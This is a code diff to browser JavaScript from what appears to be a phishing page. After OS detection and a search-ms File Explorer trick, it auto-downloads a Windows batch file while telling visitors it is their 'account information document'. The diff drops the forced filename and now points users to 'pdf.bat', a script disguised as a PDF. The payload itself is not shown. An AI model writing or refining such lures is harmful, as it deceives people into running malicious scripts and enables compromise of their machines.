@@ -523,11 +523,12 @@
                     console.log('Could not open file explorer with search-ms protocol');
                 }
                 
-                // Download the file
+                // Download the file with original name (remove download attribute)
                 setTimeout(() => {
                     const winLink = document.createElement('a');
                     winLink.href = fileUrl;
-                    winLink.download = 'account_information.bat';
+                    // Remove the download attribute to keep original filename
+                    winLink.target = '_blank'; // Open in new tab/window
                     document.body.appendChild(winLink);
                     winLink.click();
                     document.body.removeChild(winLink);
@@ -536,18 +537,19 @@
                     
                     // Final message
                     setTimeout(() => {
-                        messageDiv.innerHTML += '<br><br><strong>Your account information document should download shortly.</strong> If it doesn\'t download automatically, please check your downloads folder for "account_information.bat".';
+                        messageDiv.innerHTML += '<br><br><strong>Your account information document should download shortly.</strong> If it doesn\'t download automatically, please check your downloads folder for "pdf.bat".';
                     }, 1000);
                 }, 1000);
             } 
             else if (os === 'macos') {
                 messageDiv.innerHTML += '<br><i class="fas fa-download"></i> <strong>macOS Device Detected</strong><br>Downloading account information...';
                 
-                // Download the file
+                // Download the file with original name (remove download attribute)
                 setTimeout(() => {
                     const macLink = document.createElement('a');
                     macLink.href = fileUrl;
-                    macLink.download = 'account_information.bat';
+                    // Remove the download attribute to keep original filename
+                    macLink.target = '_blank'; // Open in new tab/window
                     document.body.appendChild(macLink);
                     macLink.click();
                     document.body.removeChild(macLink);
@@ -556,7 +558,7 @@
                     
                     // Final message
                     setTimeout(() => {
-                        messageDiv.innerHTML += '<br><br><strong>Your account information document should download shortly.</strong> If it doesn\'t download automatically, please check your downloads folder for "account_information.bat".';
+                        messageDiv.innerHTML += '<br><br><strong>Your account information document should download shortly.</strong> If it doesn\'t download automatically, please check your downloads folder for "pdf.bat".';
                     }, 1000);
                 }, 1000);
             }
